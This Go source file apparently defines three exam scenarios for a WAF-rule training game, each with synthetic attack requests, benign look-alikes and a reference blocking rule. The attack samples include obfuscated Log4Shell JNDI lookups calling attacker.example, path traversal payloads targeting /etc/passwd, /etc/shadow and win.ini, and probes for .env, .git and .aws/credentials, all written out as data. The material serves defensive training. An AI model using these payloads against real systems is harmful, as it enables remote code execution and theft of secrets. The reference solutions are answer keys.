package scenario

import (
	"math/rand/v2"
	"time"

	w "wafdy/internal/wafrule"
)

// ---------------------------------------------------------------------------
// 実戦テスト: 攻撃の詳細は事前に見せず、模範解答も公開しない。
// ラボで学んだ形の「まだ見せていない亜種」が来るので、模範解答を写しただけでは通らない。
// 正解の例 (Solution) はテストで「解ける問題であること」を確かめるためだけに使う。
// ---------------------------------------------------------------------------

func exam(s *Scenario) {
	s.Exam = true
	s.HideAttackSamples = true
	s.HideSolution = true
	s.PrepSeconds = 600
	if s.Duration == 0 {
		s.Duration = 30 * time.Second
	}
	register(s)
}

var examNote = T("攻撃の詳細と模範解答は公開されません。採点後の内訳で、どの亜種がすり抜けたかだけがわかります。",
	"Attack details and model answers are not published. After grading, the breakdown only tells you which variants got through.")

func registerExams() {
	jndi := `\$\{[^}]*(\$\{|jndi)`
	exam(&Scenario{
		ID:    "exam-1-log4shell",
		Title: T("実戦テスト 1: Log4Shell の変異体", "Field test 1: Log4Shell mutants"),
		Summary: T("あらゆる場所に、あらゆる書き方で Log4Shell が来ます。ラボの模範解答のままでは止めきれません。",
			"Log4Shell arrives everywhere, written every way. The lab model answers alone won't stop it all."),
		Topics: []Text{T("難読化", "Obfuscation"), T("検査対象の網羅", "Covering every field"), T("エンコードの重ねがけ", "Layered encodings")},
		Briefing: []Text{
			T("Log4Shell を狙う攻撃者が、検知をすり抜けるために手を変えてきました。ヘッダー、クエリ文字列、Body のどこにでも入り、難読化やエンコードの重ねがけ、JSON のエスケープも使ってきます。",
				"Attackers targeting Log4Shell have changed tactics to slip past detection. The payload can be in headers, the query string, or the body, using obfuscation, layered encoding, and JSON escapes."),
			T("あなたのサイトには、メール文面の差し込み文字列 ${name} を使う正規の機能があります (クエリ、ヘッダー、JSON のどれでも送られます)。",
				"Your site has a legitimate feature that uses email placeholders like ${name} (sent in queries, headers, or JSON)."),
			examNote,
		},
		Patterns: []Pattern{
			{Attack, T("User-Agent に入れ子の lookup", "Nested lookup in User-Agent"), 5, func(r *rand.Rand) Request {
				return withUA(atk(r, browse(r)), "${${lower:j}ndi:ldap://attacker.example/a}")
			}},
			{Attack, T("Referer に素の JNDI", "Plain JNDI in Referer"), 5, func(r *rand.Rand) Request {
				return withHeader(atk(r, browse(r)), "Referer", "${jndi:ldap://attacker.example/a}")
			}},
			{Attack, T("Cookie に ${::-j}", "${::-j} in a cookie"), 5, func(r *rand.Rand) Request {
				return withCookie(atk(r, browse(r)), "session=${${::-j}ndi:rmi://attacker.example/a}")
			}},
			{Attack, T("クエリに二重エンコード", "Double-encoded in the query"), 5, func(r *rand.Rand) Request {
				req := atk(r, get(r, "/search", ""))
				req.RawQuery = "q=%2524%257Bjndi:ldap://attacker.example/a%257D"
				return req
			}},
			{Attack, T("JSON の \\u エスケープ", "JSON \\u escapes"), 5, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/api/profile", `{"name":"${jndi:ldap://attacker.example/a}"}`))
			}},
			{Attack, T("フォームの Body", "In a form body"), 5, func(r *rand.Rand) Request {
				return atk(r, post(r, "/contact", "name=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D&msg=hi"))
			}},
			{Attack, T("${upper:} で 1 文字ずつ", "Letter by letter with ${upper:}"), 5, func(r *rand.Rand) Request {
				return withHeader(atk(r, browse(r)), "X-Request-Id", "${${upper:j}${upper:n}${upper:d}${upper:i}:dns://attacker.example}")
			}},
			{Benign, T("差し込み文字列を使う正規の利用", "Legitimate placeholder use"), 30, func(r *rand.Rand) Request {
				switch r.IntN(3) {
				case 0:
					return get(r, "/mail/compose", q("tpl", "Hello ${name}"))
				case 1:
					return withHeader(get(r, "/mail/compose", ""), "X-Greeting-Template", "Dear ${user.firstName}")
				}
				return postJSON(r, "/mail/templates", `{"template":"Your order ${order.id} has shipped"}`)
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("exam-log4shell", w.Or(
			w.Regex(jndi, w.AllHeaderValues(), w.URLDecode, w.Lowercase),
			w.Regex(jndi, w.QueryString(), w.URLDecode, w.URLDecode, w.Lowercase),
			w.Regex(jndi, w.BodyField(), w.JSDecode, w.URLDecode, w.Lowercase),
		)),
	})

	traversal := `\.\.[/\\]`
	exam(&Scenario{
		ID:    "exam-2-traversal",
		Title: T("実戦テスト 2: パストラバーサル総まとめ", "Field test 2: path traversal round-up"),
		Summary: T("パス、クエリ、Cookie、JSON のあらゆる場所から、ディレクトリを遡ろうとする攻撃が来ます。",
			"Directory climbing attempts arrive from every corner: the path, the query, cookies, and JSON."),
		Topics: []Text{T("正規化の組み合わせ", "Combining normalizations"), T("Windows 形式", "Windows-style paths"), T("誤検知の回避", "Avoiding false positives")},
		Briefing: []Text{
			T("ファイルを扱う機能がいくつもあるサイトに、ディレクトリを遡ってファイルを読もうとする攻撃が集中しています。Linux 形式 (/) と Windows 形式 (\\) の両方、さまざまなエンコードが観測されています。",
				"A site with several file-handling features is under a concentrated attack trying to read files by climbing directories. Both Linux-style (/) and Windows-style (\\) paths and various encodings have been seen."),
			T("正規のファイル名やバージョン名には、v1..v2 のようにドットが 2 つ続くものがあります。./img のような相対パスも正規の利用です。",
				"Legitimate file and version names may contain two consecutive dots, as in v1..v2. Relative paths such as ./img are legitimate too."),
			examNote,
		},
		Patterns: []Pattern{
			{Attack, T("パスに ..%2f", "..%2f in the path"), 5, func(r *rand.Rand) Request {
				return atk(r, get(r, "/static/img/..%2f..%2fapp.config", ""))
			}},
			{Attack, T("パスに二重エンコード", "Double encoding in the path"), 5, func(r *rand.Rand) Request {
				return atk(r, get(r, "/static/js/%252e%252e%252f%252e%252e%252fapp.config", ""))
			}},
			{Attack, T("クエリに Windows 形式", "Windows-style in the query"), 5, func(r *rand.Rand) Request {
				return atk(r, get(r, "/download", "file=..%5c..%5cwindows%5cwin.ini"))
			}},
			{Attack, T("クエリに入れ子表記", "Nested sequence in the query"), 5, func(r *rand.Rand) Request {
				return atk(r, get(r, "/download", q("file", "....//....//etc/passwd")))
			}},
			{Attack, T("Cookie に遡り", "Climbing in a cookie"), 5, func(r *rand.Rand) Request {
				return withCookie(atk(r, get(r, "/report", "")), "template=../../etc/passwd")
			}},
			{Attack, T("JSON に Windows 形式", "Windows-style in JSON"), 5, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/api/export", `{"path":"..\\..\\boot.ini"}`))
			}},
			{Attack, T("クエリをすべてエンコード", "Fully encoded query"), 5, func(r *rand.Rand) Request {
				return atk(r, get(r, "/view", "doc=%2e%2e%2f%2e%2e%2fetc%2fshadow"))
			}},
			{Benign, T("ドットを含む正規のファイル", "Legitimate files with dots"), 30, func(r *rand.Rand) Request {
				switch r.IntN(4) {
				case 0:
					return get(r, "/docs/v1..v2/changes.html", "")
				case 1:
					return get(r, "/download", q("file", "release..notes.txt"))
				case 2:
					return withCookie(get(r, "/report", ""), "template=monthly; returnTo=/account")
				}
				return postJSON(r, "/api/export", `{"path":"./img/a.png"}`)
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("exam-traversal", w.Or(
			w.Regex(traversal, w.UriPath(), w.URLDecode, w.URLDecode),
			w.Regex(traversal, w.QueryString(), w.URLDecode, w.URLDecode),
			w.Regex(traversal, w.Header("cookie"), w.URLDecode),
			w.Regex(traversal, w.BodyField(), w.JSDecode, w.URLDecode),
		)),
	})

	exam(&Scenario{
		ID:    "exam-3-forbidden-doors",
		Title: T("実戦テスト 3: 開けてはいけない扉", "Field test 3: doors that must stay shut"),
		Summary: T(".git や .env、管理用のエンドポイントなど、外から見えてはいけない場所を、あらゆる書き方で探されます。",
			"Attackers hunt for places that must never be visible from outside — .git, .env, management endpoints — written every possible way."),
		Topics: []Text{T("パスの正規化", "Path normalization"), T("許可すべき似た名前", "Similar names to allow")},
		Briefing: []Text{
			T("自動スキャナーが、ソースコードの履歴 (.git)、環境変数ファイル (.env)、クラウドの認証情報 (.aws)、Spring Boot の管理用エンドポイント (actuator)、Apache の状態ページ (server-status)、データベースの管理画面 (phpmyadmin) を探しています。大文字、スラッシュの重複、../ による遠回り、エンコードなど、書き方を変えてきます。",
				"Automated scanners are hunting for source history (.git), environment files (.env), cloud credentials (.aws), Spring Boot management endpoints (actuator), Apache's status page (server-status), and the database admin UI (phpmyadmin). They vary the spelling with uppercase, doubled slashes, detours via ../, and encoding."),
			T("一方で、/.well-known/ (セキュリティ連絡先など) や、environment-policy、git-guide のように似た名前の正規のページもあります。",
				"Meanwhile there are legitimate pages with similar names, such as /.well-known/ (security contacts and so on), environment-policy, and git-guide."),
			examNote,
		},
		Patterns: []Pattern{
			{Attack, T("素直な探索", "Plain probes"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, pick(r, []string{"/.git/config", "/.env", "/actuator/env", "/server-status", "/phpmyadmin/index.php", "/.aws/credentials"}), ""))
			}},
			{Attack, T("大文字で書く", "Written in uppercase"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, pick(r, []string{"/.GIT/HEAD", "/Actuator/heapdump", "/PhpMyAdmin/"}), ""))
			}},
			{Attack, T("スラッシュを重ねる", "Doubled slashes"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "//.git//config", ""))
			}},
			{Attack, T("../ で遠回りする", "Detour via ../"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/static/../.env", ""))
			}},
			{Attack, T("; でパスを区切る", "Splitting the path with ;"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/actuator;/env", ""))
			}},
			{Attack, T("ドットをエンコード", "Encoded dot"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, pick(r, []string{"/%2eenv", "/%2Egit/config"}), ""))
			}},
			{Benign, T("似た名前の正規のページ", "Legitimate pages with similar names"), 30, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/.well-known/security.txt", "/environment-policy", "/git-guide", "/actuators-catalog", "/server-statistics", "/static/env.js", "/phpmyadmin-alternatives"}), "")
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("exam-forbidden-doors", w.Regex(`^/(\.git|\.env|\.aws|actuator|server-status|phpmyadmin)(/|;|$)`, w.UriPath(), w.URLDecode, w.NormalizePath, w.Lowercase)),
	})
}
